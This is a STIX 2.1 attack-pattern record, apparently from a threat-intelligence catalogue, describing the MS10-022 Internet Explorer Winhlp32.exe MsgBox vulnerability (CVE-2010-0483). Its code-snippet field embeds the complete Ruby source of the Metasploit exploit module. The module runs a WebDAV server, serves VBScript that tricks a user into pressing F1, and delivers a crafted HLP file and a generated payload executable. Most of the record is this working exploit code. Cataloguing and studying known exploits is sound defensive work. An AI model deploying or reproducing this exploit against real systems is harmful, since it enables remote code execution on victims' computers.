{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc91df05-f61d-471f-9522-51eb95393207",
    "created": "2024-08-14T16:42:26.554594Z",
    "modified": "2024-08-14T16:42:26.554598Z",
    "name": "MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution",
    "description": " This module exploits a code execution vulnerability that occurs when a user presses F1 on MessageBox originated from VBscript within a web page. When the user hits F1, the MessageBox help functionality will attempt to load and use a HLP file from an SMB or WebDAV (if the WebDAV redirector is enabled) server.  This particular version of the exploit implements a WebDAV server that will serve HLP file as well as a payload EXE. During testing warnings about the payload EXE being unsigned were witnessed. A future version of this module might use other methods that do not create such a warning. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_022_ie_vbscript_winhlp32.rb",
            "external_id": "ms10_022_ie_vbscript_winhlp32.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0483"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.technet.com/msrc/archive/2010/02/28/investigating-a-new-win32hlp-and-internet-explorer-issue.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://isec.pl/vulnerabilities/isec-0027-msgbox-helpfile-ie.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability that occurs when a user\n        presses F1 on MessageBox originated from VBscript within a web page. When the\n        user hits F1, the MessageBox help functionality will attempt to load and use\n        a HLP file from an SMB or WebDAV (if the WebDAV redirector is enabled) server.\n\n        This particular version of the exploit implements a WebDAV server that will\n        serve HLP file as well as a payload EXE. During testing warnings about the\n        payload EXE being unsigned were witnessed. A future version of this module\n        might use other methods that do not create such a warning.\n      },\n      'Author'         =>\n        [\n          'Maurycy Prodeus',   # Original discovery\n          'jduck'              # Metasploit version\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0483' ],\n          [ 'OSVDB', '62632' ],\n          [ 'MSB', 'MS10-022' ],\n          [ 'URL', 'https://blogs.technet.com/msrc/archive/2010/02/28/investigating-a-new-win32hlp-and-internet-explorer-issue.aspx' ],\n          [ 'URL', 'https://isec.pl/vulnerabilities/isec-0027-msgbox-helpfile-ie.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Compat' =>\n          {\n            'ConnectionType' => '-find',\n          }\n        },\n      'Platform'       => 'win',\n\n      # Tested OK - Windows XP SP3 - jjd\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n\n          [ 'Internet Explorer on Windows',\n            {\n              # nothing here\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-02-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    ret = nil\n    # Check for MSIE and/or WebDAV redirector requests\n    if agent =~ /(Windows NT 6\\.0|MiniRedir\\/6\\.0)/\n      ret = targets[1]\n    elsif agent =~ /(Windows NT 5\\.1|MiniRedir\\/5\\.1)/\n      ret = targets[1]\n    elsif agent =~ /(Windows NT 5\\.2|MiniRedir\\/5\\.2)/\n      ret = targets[1]\n    elsif agent =~ /MSIE 7\\.0/\n      ret = targets[1]\n    elsif agent =~ /MSIE 6\\.0/\n      ret = targets[1]\n    else\n      print_status(\"Unknown User-Agent #{agent}\")\n    end\n\n    ret\n  end\n\n\n  def on_request_uri(cli, request)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if (request.uri == '/') or not (request.uri =~ /\\/[^\\/]+\\//)\n      if (request.uri == '/')\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    end\n\n    # dispatch WebDAV requests based on method first\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request, mytarget)\n\n    when 'PROPFIND'\n      process_propfind(cli, request, mytarget)\n\n    when 'GET'\n      process_get(cli, request, mytarget)\n\n    when 'PUT'\n      print_status(\"Sending 404 for PUT #{request.uri} ...\")\n      send_not_found(cli)\n\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n\n    end\n\n  end\n\n\n  #\n  # GET requests\n  #\n  def process_get(cli, request, target)\n\n    print_status(\"Responding to GET request #{request.uri}\")\n    # dispatch based on extension\n    if (request.uri =~ /\\.hlp$/i)\n      #\n      # HLP requests sent by IE and the WebDav Mini-Redirector\n      #\n      print_status(\"Sending HLP\")\n      # Transmit the compressed response to the client\n      send_response(cli, generate_hlp(target), { 'Content-Type' => 'application/octet-stream' })\n\n    elsif (request.uri =~ /calc\\.exe$/i)\n      #\n      # send the EXE\n      #\n      print_status(\"Sending EXE\")\n      # Re-generate the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n      exe = generate_payload_exe({ :code => p.encoded })\n      send_response(cli, exe, { 'Content-Type' => 'application/octet-stream' })\n\n    else\n      #\n      # HTML requests sent by IE and Firefox\n      #\n      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n      name = rand_text_alphanumeric(rand(8)+8)\n      #path = get_resource.gsub(/\\//, '\\\\')\n      path = request.uri.gsub(/\\//, '\\\\')\n      unc = '\\\\\\\\' + my_host + path + name + '.hlp'\n      print_status(\"Using #{unc} ...\")\n      html = %Q|<html>\n<script type=\"text/vbscript\">\nMsgBox \"Welcome!  Press F1 to dismiss this dialog.\", ,\"Welcome!\", \"#{unc}\", 1\n</script>\n</html>\n|\n      print_status(\"Sending HTML page\")\n      send_response(cli, html)\n\n    end\n  end\n\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request, target)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request, target)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request\")\n    body = ''\n\n    if (path =~ /calc\\.exe$/i)\n      # Uncommenting the following will use the target system's calc (as specified in the .hlp)\n      #print_status(\"Sending 404 for #{path} ...\")\n      #send_not_found(cli)\n      #return\n\n      # Response for the EXE\n      print_status(\"Sending EXE multistatus for #{path} ...\")\n#<lp1:getcontentlength>45056</lp1:getcontentlength>\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>\n<lp2:executable>F</lp2:executable>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n    elsif (path =~ /\\.hlp/i)\n      print_status(\"Sending HLP multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\"?>\n<a:multistatus xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\" xmlns:c=\"xml:\" xmlns:a=\"DAV:\">\n<a:response>\n</a:response>\n</a:multistatus>\n|\n    elsif (path =~ /\\.manifest$/i) or (path =~ /\\.config$/i) or (path =~ /\\.exe/i)\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n\n  #\n  # Generate a HLP file that will trigger the vulnerability\n  #\n  def generate_hlp(target)\n    @hlp_data\n  end\n\n\n  #\n  # When exploit is called, load the runcalc.hlp file\n  #\n  def exploit\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"runcalc.hlp\")\n    fd = File.open(path, \"rb\")\n    @hlp_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-26",
    "x_mitre_platforms": [
        "win'"
    ]
}